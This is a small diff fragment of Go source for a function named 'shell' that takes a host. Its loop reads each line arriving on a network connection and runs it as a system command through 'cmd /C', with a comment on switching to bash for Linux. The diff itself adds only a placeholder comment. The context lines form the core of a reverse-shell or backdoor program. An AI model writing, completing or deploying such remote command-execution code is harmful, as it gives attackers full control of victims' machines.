@@ -21,6 +21,7 @@ func shell(host string) {
 		log.Println(err)
 	}
 	for {
+		// if conn == ???
 		message, _ := bufio.NewReader(conn).ReadString('\n')
 		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
 		if err != nil {
